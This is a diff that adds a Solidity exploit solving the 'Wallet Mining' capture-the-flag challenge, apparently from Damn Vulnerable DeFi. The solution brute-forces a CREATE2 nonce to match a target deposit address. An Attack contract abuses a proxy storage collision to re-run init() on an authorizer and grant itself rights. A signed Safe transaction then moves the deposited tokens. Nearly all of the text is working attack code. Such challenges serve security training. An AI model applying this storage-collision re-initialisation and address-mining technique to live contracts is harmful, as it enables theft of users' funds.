@@ -156,7 +156,99 @@ contract WalletMiningChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_walletMining() public checkSolvedByPlayer {}
+    function test_walletMining() public checkSolvedByPlayer {
+        // Create owners array with user as the only owner
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        // Set threshold for 1-of-1 Safe
+        uint256 threshold = 1;
+        // Create initialization data
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners, // _owners: List of Safe owners
+                threshold, // _threshold: Number of required confirmations
+                address(0), // to: Contract address for optional delegate call
+                bytes(""), // data: Data payload for optional delegate call
+                address(0), // fallbackHandler: Handler for fallback calls to the Safe
+                address(0), // paymentToken: Token that should be used for the payment
+                0, // payment: Value that should be paid
+                payable(address(0)) // paymentReceiver: Address that should receive the payment
+            )
+        );
+
+        uint256 correctNonce;
+        address calculatedAddress;
+        for (uint256 i = 0; i < 1000; i++) {
+            calculatedAddress = getAddress(address(proxyFactory), address(singletonCopy), initializer, i);
+
+            if (calculatedAddress == USER_DEPOSIT_ADDRESS) {
+                correctNonce = i;
+                break;
+            }
+        }
+        // the correct nonce is found, now the drop function can be called and wallet can be deployed.
+        new Attack(authorizer, initializer, USER_DEPOSIT_ADDRESS, correctNonce, walletDeployer, token, ward);
+
+        // now that the wallet is deployed, execute the token transfer from the Safe to the user
+        Safe userSafe = Safe(payable(USER_DEPOSIT_ADDRESS));
+        bytes memory execData;
+        {
+            address to = address(token);
+            uint256 value = 0;
+            bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
+            Enum.Operation operation = Enum.Operation.Call;
+            uint256 safeTxGas = 0;
+            uint256 baseGas = 0;
+            uint256 gasPrice = 0;
+            address gasToken = address(0);
+            address refundReceiver = address(0);
+            uint256 nonce = 0;
+            bytes memory signatures;
+            
+            bytes32 txHash = userSafe.getTransactionHash(
+                to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, nonce
+            );
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+            
+            signatures = abi.encodePacked(r, s, v);
+            execData = abi.encodeWithSelector(
+                singletonCopy.execTransaction.selector,
+                to,
+                value,
+                data,
+                operation,
+                safeTxGas,
+                baseGas,
+                gasPrice,
+                gasToken,
+                refundReceiver,
+                signatures
+            );
+        }
+
+        (bool success,) = calculatedAddress.call(execData);
+        require(success, "transfer to user failed");
+    }
+
+    function getAddress(
+        address factory,
+        address singleton,
+        bytes memory initializer,
+        uint256 saltNonce
+    ) public pure returns (address) {
+        // Calculate the salt used by the factory
+        // This matches the logic in SafeProxyFactory.createProxyWithNonce
+        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
+
+        // Get the creation code for the proxy
+        bytes memory proxyCreationCode = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(singleton)));
+
+        // Calculate the CREATE2 address
+        return address(
+            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), factory, salt, keccak256(proxyCreationCode)))))
+        );
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -186,5 +278,29 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract Attack {
+    constructor(
+        AuthorizerUpgradeable authorizer,
+        bytes memory initializer,
+        address USER_DEPOSIT_ADDRESS,
+        uint256 correctNonce,
+        WalletDeployer walletDeployer,
+        DamnValuableToken token,
+        address ward
+    ) {
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = USER_DEPOSIT_ADDRESS;
+        // due to storage collision in proxy and the authorizableUpgradable it's possible to call init() function
+        // now that player becomes ward, "can" function will return true when drop is called.
+        authorizer.init(wards, aims);
+
+        bool success = walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, correctNonce);
+        require(success, "Deployment failed");
+        token.transfer(ward, 1 ether);
     }
 }
